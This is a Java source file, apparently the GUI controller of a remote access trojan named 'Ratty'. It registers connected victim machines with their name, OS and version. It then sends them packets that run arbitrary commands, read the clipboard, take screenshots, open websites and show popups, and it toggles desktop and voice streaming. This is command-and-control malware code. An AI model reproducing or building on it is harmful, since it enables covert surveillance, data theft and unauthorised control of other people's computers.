package de.sogomn.rat.server.gui;

import java.util.ArrayList;

import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.IConnectionObserver;
import de.sogomn.rat.packet.ClipboardPacket;
import de.sogomn.rat.packet.CommandPacket;
import de.sogomn.rat.packet.FreePacket;
import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.InformationPacket;
import de.sogomn.rat.packet.PopupPacket;
import de.sogomn.rat.packet.ScreenshotPacket;
import de.sogomn.rat.packet.WebsitePacket;
import de.sogomn.rat.server.ActiveServer;
import de.sogomn.rat.server.IServerObserver;

public final class RattyGuiController implements IServerObserver, IConnectionObserver, IGuiController {
	
	private RattyGui gui;
	
	private ArrayList<ServerClient> clients;
	
	public RattyGuiController(final RattyGui gui) {
		this.gui = gui;
		
		clients = new ArrayList<ServerClient>();
		
		gui.addListener(this);
	}
	
	/*
	 * ==================================================
	 * HANDLING
	 * ==================================================
	 */
	
	private PopupPacket createPopupPacket() {
		final String input = gui.getInput();
		
		if (input != null) {
			final PopupPacket packet = new PopupPacket(input);
			
			return packet;
		}
		
		return null;
	}
	
	private CommandPacket createCommandPacket() {
		final String input = gui.getInput();
		
		if (input != null) {
			final CommandPacket packet = new CommandPacket(input);
			
			return packet;
		}
		
		return null;
	}
	
	private WebsitePacket createWebsitePacket() {
		final String input = gui.getInput();
		
		if (input != null) {
			final WebsitePacket packet = new WebsitePacket(input);
			
			return packet;
		}
		
		return null;
	}
	
	private boolean handlePacket(final ServerClient client, final IPacket packet) {
		return false;
	}
	
	private void handleCommand(final ServerClient client, final String command) {
		//...
	}
	
	private IPacket getPacket(final String command, final ServerClient client) {
		IPacket packet = null;
		
		if (command == RattyGui.FREE) {
			packet = new FreePacket();
		} else if (command == RattyGui.POPUP) {
			packet = createPopupPacket();
		} else if (command == RattyGui.CLIPBOARD) {
			packet = new ClipboardPacket();
		} else if (command == RattyGui.COMMAND) {
			packet = createCommandPacket();
		} else if (command == RattyGui.SCREENSHOT) {
			packet = new ScreenshotPacket();
		} else if (command == RattyGui.WEBSITE) {
			packet = createWebsitePacket();
		}
		
		return packet;
	}
	
	/*
	 * ==================================================
	 * LOGIC
	 * ==================================================
	 */
	
	private void logIn(final ServerClient client, final InformationPacket packet) {
		final String name = packet.getName();
		final String os = packet.getOs();
		final String version = packet.getVersion();
		
		client.logIn(name, os, version);
		gui.addRow(client);
	}
	
	@Override
	public void packetReceived(final ActiveConnection connection, final IPacket packet) {
		final ServerClient client = getClient(connection);
		final boolean loggedIn = client.isLoggedIn();
		
		if (loggedIn) {
			final boolean consumed = handlePacket(client, packet);
			
			if (!consumed) {
				packet.execute(connection);
			}
		} else if (packet instanceof InformationPacket) {
			final InformationPacket information = (InformationPacket)packet;
			
			logIn(client, information);
		}
	}
	
	@Override
	public void connected(final ActiveServer server, final ActiveConnection connection) {
		final ServerClient client = new ServerClient(connection);
		final InformationPacket packet = new InformationPacket();
		
		connection.setObserver(this);
		connection.start();
		connection.addPacket(packet);
		clients.add(client);
	}
	
	@Override
	public void disconnected(final ActiveConnection connection) {
		final ServerClient client = getClient(connection);
		
		gui.removeRow(client);
		clients.remove(client);
		
		client.setStreamingDesktop(false);
		client.setStreamingVoice(false);
		
		connection.setObserver(null);
		connection.close();
	}
	
	@Override
	public void closed(final ActiveServer server) {
		gui.removeAllListeners();
		
		clients.stream().forEach(client -> {
			client.connection.setObserver(null);
			client.connection.close();
		});
		
		clients.clear();
	}
	
	@Override
	public void userInput(final String command) {
		final ServerClient client = gui.getLastServerClientClicked();
		final IPacket packet = getPacket(command, client);
		
		handleCommand(client, command);
		
		if (packet != null) {
			client.connection.addPacket(packet);
		}
	}
	
	public ServerClient getClient(final ActiveConnection connection) {
		for (final ServerClient serverClient : clients) {
			if (serverClient.connection == connection) {
				return serverClient;
			}
		}
		
		return null;
	}
	
}
